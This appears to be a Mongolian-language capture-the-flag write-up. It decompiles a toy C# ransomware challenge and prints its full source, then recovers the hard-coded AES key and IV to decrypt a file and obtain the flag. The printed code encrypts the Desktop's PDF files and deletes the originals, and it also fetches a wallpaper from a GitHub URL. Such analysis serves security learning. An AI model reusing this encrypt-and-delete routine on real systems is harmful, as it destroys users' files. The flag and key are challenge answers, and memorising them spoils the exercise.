Өгөгдсөн ransomware нь C# дээр бичигдсэн тул эх кодыг нь decompile хийн гарган авах боломжтой байдаг.
Тиймээс .NET compiler ашиглан ямар2 үйлдэл хийж байгааг нь эх хувилбараар нь харах боломжтой.

JetBrains Dotpeek tool-ыг ашиглан decompile хийв:
```
// Decompiled with JetBrains decompiler
// Type: Program
// Assembly: ctfaa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F0DE5C4F-4DFE-4071-A926-68517EDCA074
// Assembly location: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ctfaa.exe
// Compiler-generated code is shown

using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class Program
{
  private const int SPI_SETDESKWALLPAPER = 20;
  private const int SPIF_UPDATEINIFILE = 1;
  private const int SPIF_SENDCHANGE = 2;
  private static readonly string key;

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(
    int uAction,
    int uParam,
    string lpvParam,
    int fuWinIni);

  private static void Main(string[] args)
  {
    Program.EncryptFilesWithExtension(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), ".pdf");
    if (Program.ChangeDesktopWallpaper("https://raw.githubusercontent.com/xyptonize/detective-iconan/refs/heads/main/test123.png"))
      return;
    Console.WriteLine("Failed to download the image. Please manually download it.");
  }

  private static void EncryptFilesWithExtension(string directoryPath, string extension)
  {
    foreach (string file in Directory.GetFiles(directoryPath, "*" + extension))
    {
      string contents = Program.EncryptString(System.IO.File.ReadAllText(file), Program.key);
      string path = file + ".locked";
      System.IO.File.WriteAllText(path, contents);
      Console.WriteLine("Encrypted: " + file + " -> " + path);
      System.IO.File.Delete(file);
      Console.WriteLine("Deleted original file: " + file);
    }
  }

  private static string EncryptString(string text, string key)
  {
    byte[] bytes1 = Encoding.UTF8.GetBytes(key);
    byte[] bytes2 = Encoding.UTF8.GetBytes(text);
    byte[] bytes3 = Encoding.UTF8.GetBytes("CTFWOW1234567890");
    using (Aes aes = Aes.Create())
    {
      aes.Key = bytes1;
      aes.IV = bytes3;
      using (ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
        return Convert.ToBase64String(Program.PerformCryptography(bytes2, encryptor));
    }
  }

  private static string DecryptString(string cipherText, string key)
  {
    byte[] bytes1 = Encoding.UTF8.GetBytes(key);
    byte[] data = Convert.FromBase64String(cipherText);
    byte[] bytes2 = Encoding.UTF8.GetBytes("CTFHTR1234567890");
    using (Aes aes = Aes.Create())
    {
      aes.Key = bytes1;
      aes.IV = bytes2;
      using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
        return Encoding.UTF8.GetString(Program.PerformCryptography(data, decryptor));
    }
  }

  private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
  {
    using (MemoryStream memoryStream = new MemoryStream())
    {
      using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoTransform, CryptoStreamMode.Write))
      {
        cryptoStream.Write(data, 0, data.Length);
        cryptoStream.FlushFinalBlock();
        return memoryStream.ToArray();
      }
    }
  }

  private static bool ChangeDesktopWallpaper(string url)
  {
    try
    {
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      using (WebClient webClient = new WebClient())
      {
        string str = Path.Combine(Path.GetTempPath(), "wallpaper.png");
        webClient.DownloadFile(new Uri(url), str);
        Program.SystemParametersInfo(20, 0, str, 3);
        return true;
      }
    }
    catch (WebException ex)
    {
      Console.WriteLine("Error downloading file: " + ex.Message);
      return false;
    }
  }

  static Program()
  {
    Program.key = "CTFWoWRans0mwareMast3r0000000000";
  }

  public Program()
  {
    base.\u002Ector();
  }
}
```


Дээрх кодноос харвал тухайн програмын нь AES шифтлэлт ашиглан файлыг нууцалж байгаа ба түлхүүр нь:
Program.key = "CTFWoWRans0mwareMast3r0000000000";
IV :  byte[] bytes3 = Encoding.UTF8.GetBytes("CTFWOW1234567890");


Бидэнд анх өгөгдсөн encrypted text-ыг уг хоёр утгын тусламжтайгаар тайлах боломжтой.
https://www.devglan.com/online-tools/aes-encryption-decryption

Уг online tool-ыг ашиглан тайлах боломжтой.

AES Decryption хэсэгт
AES Encrypted Text: 8qVPkxlU0Zz8PAh1Gy1ZtS5d5C2FCjM+phr1EnTRMTI= (nest.pdf.locked файлын content)
Enter IV Used During Encryption(Optional): CTFWOW1234567890
Key Size in Bits: 256
Enter Secret Key used for Encryption: CTFWoWRans0mwareMast3r0000000000

Decrypt товчийг дарахад флаг гарж ирнэ:

Flag: nest{w0w_N1c3-s4v3}




